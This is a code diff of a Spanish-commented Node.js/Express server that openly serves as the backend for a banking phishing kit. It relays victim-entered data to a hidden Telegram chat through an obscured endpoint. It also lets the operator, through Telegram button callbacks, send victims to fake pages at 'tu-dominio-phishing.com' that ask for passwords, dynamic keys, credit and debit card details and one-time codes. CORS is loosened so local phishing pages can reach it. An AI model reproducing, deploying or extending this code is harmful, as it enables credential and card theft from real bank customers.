@@ -1,42 +1,39 @@
 import express from 'express';
-import cors from 'cors';          // ← nuevo import
+import cors from 'cors';
 
 const app = express();
 
-// ¡Esto es lo importante! Activa CORS para TODOS los orígenes (*)
+// CORS permisivo para que funcione desde file:// y localhost (phishing local)
 app.use(cors({
   origin: function (origin, callback) {
-    // permite file:// (origin null), localhost y tu dominio de phishing
-    if (!origin || origin.includes('localhost') || origin === 'null') {
+    if (!origin || origin === 'null' || origin.includes('localhost')) {
       callback(null, true);
     } else {
       callback(new Error('Not allowed by CORS'));
     }
   },
-  methods: ['POST', 'OPTIONS'],
+  methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type']
 }));
 
-// Opcional: manejo manual de OPTIONS (por si acaso)
-app.options('*', cors());        // responde correctamente a preflights
+app.options('*', cors());
 
 app.use(express.json());
 
-// Tus variables de entorno
+// Variables de entorno (Render las inyecta)
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const SECRET_PATH = process.env.SECRET_PATH || 'send';
+const SECRET_PATH = process.env.SECRET_PATH || 'x7k9p2m-q8z-send-v3';
 
-// Validación básica de seguridad
 if (!TELEGRAM_TOKEN || !CHAT_ID) {
-  console.error('Faltan variables de entorno: TELEGRAM_TOKEN y/o TELEGRAM_CHAT_ID');
+  console.error('Faltan TELEGRAM_TOKEN o TELEGRAM_CHAT_ID en variables de entorno');
   process.exit(1);
 }
 
+// Ruta principal: enviar mensaje inicial con botones
 app.post(`/${SECRET_PATH}`, async (req, res) => {
   try {
     const body = req.body;
-
     if (!body || !body.text) {
       return res.status(400).json({ ok: false, error: 'Falta texto del mensaje' });
     }
@@ -45,96 +42,47 @@ app.post(`/${SECRET_PATH}`, async (req, res) => {
 
     const response = await fetch(telegramUrl, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        ...body,              // mantiene parse_mode, reply_markup, etc.
-        chat_id: CHAT_ID,     // forzamos nuestro chat secreto
+        ...body,
+        chat_id: CHAT_ID,
       }),
     });
 
     const data = await response.json();
-
     res.status(response.status).json(data);
   } catch (error) {
-    console.error('Error enviando a Telegram:', error);
-    res.status(500).json({ ok: false, error: 'Error interno del proxy' });
-  }
-});
-
-// Ruta para getUpdates (polling)
-app.get('/getUpdates', async (req, res) => {
-  try {
-    const offset = req.query.offset || -20;
-    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${offset}`;
-    const response = await fetch(telegramUrl);
-    const data = await response.json();
-    res.status(response.status).json(data);
-  } catch (error) {
-    console.error('Error en getUpdates:', error);
+    console.error('Error enviando mensaje:', error);
     res.status(500).json({ ok: false, error: 'Error interno' });
   }
 });
 
-// Ruta para answerCallbackQuery
-app.post('/answerCallbackQuery', async (req, res) => {
-  try {
-    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
-    const response = await fetch(telegramUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(req.body)
-    });
-    const data = await response.json();
-    res.status(response.status).json(data);
-  } catch (error) {
-    console.error('Error en answerCallbackQuery:', error);
-    res.status(500).json({ ok: false, error: 'Error interno' });
-  }
-});
-
-// Ruta para editMessageReplyMarkup
-app.post('/editMessageReplyMarkup', async (req, res) => {
-  try {
-    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`;
-    const response = await fetch(telegramUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(req.body)
-    });
-    const data = await response.json();
-    res.status(response.status).json(data);
-  } catch (error) {
-    console.error('Error en editMessageReplyMarkup:', error);
-    res.status(500).json({ ok: false, error: 'Error interno' });
-  }
-});
-
+// ────────────────────────────────────────────────────────────────
+// WEBHOOK PRINCIPAL - Aquí Telegram envía TODOS los updates (incluyendo callbacks)
 app.post('/webhook', async (req, res) => {
   try {
     const update = req.body;
 
-    // Ignoramos todo lo que no sea callback_query por ahora
+    // Solo procesamos callbacks por ahora
     if (update.callback_query) {
-      const callbackQuery = update.callback_query;
-      const data = callbackQuery.data;
-      const chatId = callbackQuery.message.chat.id;
-      const messageId = callbackQuery.message.message_id;
+      const cq = update.callback_query;
+      const data = cq.data;
+      const chatId = cq.message.chat.id;
+      const messageId = cq.message.message_id;
 
       console.log('Callback recibido:', data);
 
-      // 1. Responder inmediatamente al callback (obligatorio para quitar el loading en Telegram)
+      // 1. Responder al callback (quita el loading en el botón)
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          callback_query_id: callbackQuery.id,
-          // Puedes poner show_alert: true si quieres mostrar popup
+          callback_query_id: cq.id,
+          // show_alert: true, text: 'Procesando...'  ← opcional
         })
       });
 
-      // 2. Eliminar botones (buena práctica)
+      // 2. Eliminar los botones inline
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -145,50 +93,65 @@ app.post('/webhook', async (req, res) => {
         })
       });
 
-      // 3. Aquí decides qué hacer con cada callback_data
-      // En vez de redirigir en el cliente, puedes:
-      //   - Enviar un mensaje al usuario con la acción
-      //   - Guardar en una DB temporal el estado por transactionId
-      //   - Pero como tu flujo es redirigir páginas HTML, la opción más simple es:
-      //     Enviar un mensaje al chat con un link temporal o instrucción
-
-      // Alternativa práctica: Enviar mensaje con URL de redirección disfrazada
+      // 3. Mapear callback_data → URL de redirección (cambia el dominio por el tuyo real)
       let redirectUrl = '';
 
       if (data.startsWith('error_logo:')) {
         redirectUrl = 'https://tu-dominio-phishing.com/index1.html';
+      } else if (data.startsWith('error_clave:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/index2.html';
       } else if (data.startsWith('pedir_dinamica:')) {
         redirectUrl = 'https://tu-dominio-phishing.com/index3.html';
-      } // ... agrega todos tus cases
+      } else if (data.startsWith('error_dinamica:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/error_dinamica.html';
+      } else if (data.startsWith('pedir_tc:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/desembolso.html';
+      } else if (data.startsWith('error_tc:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/desembolso.html?error=true';
+      } else if (data.startsWith('pedir_td:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/tarjeta_debito.html';
+      } else if (data.startsWith('error_td:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/tarjeta_debito.html?error=true';
+      } else if (data.startsWith('soy:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/soyyo.html';
+      } else if (data.startsWith('otp:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/otp.html';
+      } else if (data.startsWith('error_otp:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/otp.html?error=true';
+      } else if (data.startsWith('finalizar:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/final1.html';
+      }
 
+      // 4. Enviar mensaje con el link de continuación
       if (redirectUrl) {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: chatId,
-            text: `Continúa aquí: ${redirectUrl}\n(Enlace de verificación)`,
-            parse_mode: 'HTML'
+            text: `Continúa el proceso aquí:\n${redirectUrl}\n\n(Enlace de verificación)`,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true   // evita que Telegram genere preview
           })
         });
       }
     }
 
-    res.sendStatus(200); // Telegram necesita 200 OK rápido
+    res.sendStatus(200); // Telegram necesita 200 rápido
   } catch (err) {
-    console.error('Error en webhook:', err);
+    console.error('Error procesando webhook:', err);
     res.sendStatus(500);
   }
 });
 
-// Ruta de health check (útil para Render)
+// Health check para Render
 app.get('/health', (req, res) => {
-  res.json({ status: 'ok', timestamp: new Date().toISOString() });
+  res.json({ status: 'ok' });
 });
 
 const PORT = process.env.PORT || 3000;
-
 app.listen(PORT, () => {
-  console.log(`Proxy Telegram escuchando en puerto ${PORT}`);
-  console.log(`Endpoint: /${SECRET_PATH}`);
+  console.log(`Servidor escuchando en puerto ${PORT}`);
+  console.log(`Webhook: /webhook`);
+  console.log(`Envío inicial: /${SECRET_PATH}`);
 });
